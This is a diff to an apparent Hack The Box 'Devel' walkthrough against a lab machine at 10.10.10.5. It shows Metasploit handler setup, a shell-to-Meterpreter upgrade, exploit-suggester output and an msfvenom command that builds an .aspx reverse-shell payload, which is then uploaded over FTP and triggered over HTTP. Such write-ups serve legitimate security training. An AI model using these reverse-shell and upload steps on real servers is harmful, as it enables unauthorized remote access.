@@ -211,6 +211,7 @@ c:\windows\system32\inetsrv>
 ```
 
 Alternatively, we can also use `exploit/multi/handler`.
+NOTE: USE THE CORRECT PAYLOAD, ie `windows/shell/reverse_tcp` instead of default `generic/shell_reverse_tcp`.
 ```
 msf5 > use exploit/multi/handler
 ...
@@ -356,8 +357,94 @@ C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
 ```
 We don't find anything interesting we can use, or know how to use unfortunately.
 
+## Fixing Errors and Getting Meterpreter for Privilege Escalation!
+I made a huge error. Time to make things right as rain.
+
+The reason why `msf5 > use post/multi/manage/shell_to_meterpreter` failed previously was because default payload `generic/shell_reverse_tcp` for `exploit/multi/handler` was used instead of `windows/shell/reverse_tcp`.
+```
+msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+```
+Running our original payload `shell.aspx`, we get a proper session type this time that shows `shell x86/windows` instead of `shell sparc/bsd`.
+```
+Active sessions
+===============
+  Id  Name  Type               Information                                                                       Connection
+  --  ----  ----               -----------                                                                       ----------
+  3         shell x86/windows  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49180 (10.10.10.5)
+```
+
+This time, we could actually run `post/multi/manage/shell_to_meterpreter` without errors!
+```
+msf5 > use post/multi/manage/shell_to_meterpreter
+...
+msf5 post(multi/manage/shell_to_meterpreter) > exploit
+
+[*] Upgrading session ID: 3
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.x.x:4433 
+[*] Post module execution completed
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 4 opened (10.10.x.x:4433 -> 10.10.10.5:49181) at 2020-11-28 23:43:42 +0800
+[*] Stopping exploit/multi/handler
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  3         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49180 (10.10.10.5)
+  4         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL   
+```
+Heck yeah! We got a meterpreter shell!
+
+## Privilege Escalation
+```
+meterpreter > getuid
+Server username: IIS APPPOOL\Web
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+```
+Ah shit, getsystem didn't work.
+
+It's time to to do some research! [Research source, under Post Modules](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
+```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 34 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+```
+
 ## Another Reverse Shell, with Meterpreter & MSFVenom
 Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
-`ftp> put devel.aspx`.
-Of course run a `msf5 > use exploit/multi/handler`.
-`http://10.10.10.5/devel.aspx`.
+```
+msf5 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
+[*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2818 bytes
+```
+
+Same shit, put the `.aspx` in the FTP with `ftp> put devel.aspx`.
+Of course run a `msf5 > use exploit/multi/handler` and execute `http://10.10.10.5/devel.aspx` to get a reverse shell.
